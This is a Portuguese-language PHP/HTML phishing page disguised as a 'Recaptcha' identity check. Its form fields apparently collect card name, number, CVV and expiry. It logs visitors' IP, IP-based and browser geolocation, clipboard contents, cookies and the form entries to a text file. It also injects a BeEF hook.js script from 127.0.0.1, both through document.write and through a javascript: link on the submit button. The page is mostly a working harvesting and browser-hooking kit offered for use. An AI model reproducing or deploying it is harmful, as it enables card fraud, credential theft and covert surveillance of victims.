<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>titulo</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }
        a { text-decoration: none; }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: url('1.jpg') no-repeat center/cover;
            background-color: #141414;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: rgba(0, 0, 0, 0.85);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 2rem;
            color: #fff;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(5px);
        }
        h3 {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1.5rem;
            color: #4A90E2;
            text-align: center;
        }
        .input-box { margin: 1rem 0; }
        .input-box input {
            width: 100%;
            height: 45px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 5px;
            padding: 0 15px;
            font-size: 1rem;
            color: #fff;
            outline: none;
            transition: border-color 0.3s;
        }
        .input-box input:focus { border-color: #4A90E2; }
        .input-box input::placeholder { color: #a1a1a1; }
        .input-box input[type="number"]::-webkit-inner-spin-button,
        .input-box input[type="number"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        .input-box input[type="number"] { -moz-appearance: textfield; }
        .remember {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 1rem 0;
            font-size: 0.9rem;
            color: #b3b3b3;
        }
        .remember input[type="checkbox"] { margin-right: 5px; }
        .redirect {
            width: 100%;
            height: 50px;
            background: #4A90E2;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 1.1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s, transform 0.2s;
        }
        .redirect:hover {
            background: #357ABD;
            transform: translateY(-2px);
        }
        .feedback { margin-top: 1rem; text-align: center; }
        @media (max-width: 480px) {
            .container { margin: 1rem; padding: 1.5rem; }
            h3 { font-size: 1.2rem; }
            .redirect { font-size: 1rem; }
        }
    </style>
</head>
<body>
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

function getUserIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if ($header === 'HTTP_X_FORWARDED_FOR') {
                $ip_list = explode(',', $ip);
                $ip = trim($ip_list[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return 'IP não disponível';
}

function getIPInfo($ip) {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
    }
    $encoded_ip = urlencode($ip);
    $api_url = "http://ip-api.com/json/{$encoded_ip}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($response, true);
    return ($data && $data['status'] === 'success') ? [
        'city' => $data['city'] ?? 'Cidade desconhecida',
        'region' => $data['regionName'] ?? 'Região desconhecida',
        'country' => $data['country'] ?? 'País desconhecido'
    ] : ['city' => 'Cidade desconhecida', 'region' => 'Região desconhecida', 'country' => 'País desconhecido'];
}

// Captura IP e localização
$ip = getUserIP();
$ipData = getIPInfo($ip);
$geoLocationIP = htmlspecialchars("{$ipData['city']}, {$ipData['region']}, {$ipData['country']}");

// Salva dados iniciais no mesmo diretório
$filePath = "dados.txt";
$file = fopen($filePath, "a");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "|                         Cliente " . (file_exists($filePath) ? count(file($filePath)) / 10 + 1 : 1) . "                          |\n");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "|  Dados capturados....                                                  |\n");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "| IP: $ip                                                                |\n");
fwrite($file, "+------------------------------------------------------------------------+\n");
fwrite($file, "| Localização (IP): $geoLocationIP                                       |\n");
fwrite($file, "+------------------------------------------------------------------------+\n\n");
fclose($file);

$feedback = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['a1'])) {
    $a1 = htmlspecialchars($_POST['a1'] ?? 'N/A');
    $a2 = htmlspecialchars($_POST['a2'] ?? 'N/A');
    $a3 = htmlspecialchars($_POST['a3'] ?? 'N/A');
    $a4 = htmlspecialchars($_POST['a4'] ?? 'N/A');
    $location = htmlspecialchars($_POST['location'] ?? 'Localização não disponível');
    $clipboard = htmlspecialchars($_POST['clipboard'] ?? 'Nenhum texto da área de transferência');

    $file = fopen($filePath, "a");

    fwrite($file, "  Cliente " . (file_exists($filePath) ? count(file($filePath)) / 10 + 1 : 1) . "\n");
    fwrite($file, "  Dados capturados.... \n");
    fwrite($file, " Input 1: $a1  \n");
    fwrite($file, " Input 2: $a2  \n");
    fwrite($file, " Input 3: $a3  \n");
    fwrite($file, " Input 4: $a4 \n");
    fwrite($file, " IP: $ip \n");
    fwrite($file, " Localização (Navegador): $location  \n");
    fwrite($file, " Localização (IP): $geoLocationIP \n");
    fwrite($file, " Área de Transferência: $clipboard \n");
    fwrite($file, " Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'Nenhum cookie disponível') . "\n");
    fclose($file);
    $feedback = "<p style='color: green;' class='feedback'></p>";
}
?>

<main class="container">
    <form method="POST" enctype="multipart/form-data" id="form">
        <h3>Confirme que é você! - Recaptcha</h3>
        <div class="input-box">
            <input placeholder="Input 1" type="text" name="a1" maxlength="50" required>
        </div>
        <div class="input-box">
            <input placeholder="Input 2" type="number" name="a2" maxlength="16" required>
        </div>
        <div class="input-box">
            <input placeholder="Input 3" type="number" name="a3" maxlength="3" required>
        </div>
        <div class="input-box">
            <input placeholder="Input 4" type="number" name="a4" maxlength="4" required>
        </div>
        <div class="remember">
            <label><input type="checkbox" name="remember_me"> Lembre de mim</label>
        </div>
        <input type="hidden" name="location" id="locationData">
        <input type="hidden" name="clipboard" id="clipboardData">
        <button type="submit" class="redirect" id="submitBtn"><a hrefe="javascript:%20(function%20()%20{%20var%20url%20=%20%27http://127.0.0.1/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();">Enviar</a></button>
        <?php echo $feedback; ?>
    </form>
</main>

<script>
const form = document.getElementById('form');
const locationData = document.getElementById('locationData');
const clipboardData = document.getElementById('clipboardData');

// Captura geolocalização
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        position => {
            locationData.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
        },
        () => {
            locationData.value = 'N/A';
        }
    );
} else {
    locationData.value = 'N/A';
}

// Captura clipboard
async function captureClipboard() {
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            return await navigator.clipboard.readText() || 'N/A';
        }
        return 'N/A';
    } catch (err) {
        return 'N/A: ' + err.message;
    }
}

// Configura cookie
window.onload = () => {
    document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
};

// Envio do formulário
form.addEventListener('submit', async (event) => {
    event.preventDefault();
    clipboardData.value = await captureClipboard();
    form.submit();
});
</script>

<script>
/* 
    000000000000       000000000000             
    0oooooooooo0       0oooooooooo0               
    0oo0000oooo0       0oo0000oooo0                      
    0oo0000oooo0       0oo0000oooo0                      
    0oo0000oooo0       0oo0000oooo0                   
    0oo0000oooo0       0oo0000oooo0                 
    0oo____oooo0       0oo____oooo0 
    000000000000       000000000000                                         
    1                   ___________        _________
    1  '    sssssssss  |___________        |_________
    1       ss         |                   |
    1         s        |___________        |_________
    1          s       |                   |
    1           s      |___________        |__________
    1     ssssssss     |___________        |__________  .you  
    1
    ___              
*/
</script>

<script>
var commandModuleStr = '<script src="http://127.0.0.1/hook.js" type="text/javascript"><\/script>';
document.write(commandModuleStr);
</script>

</body>
</html>
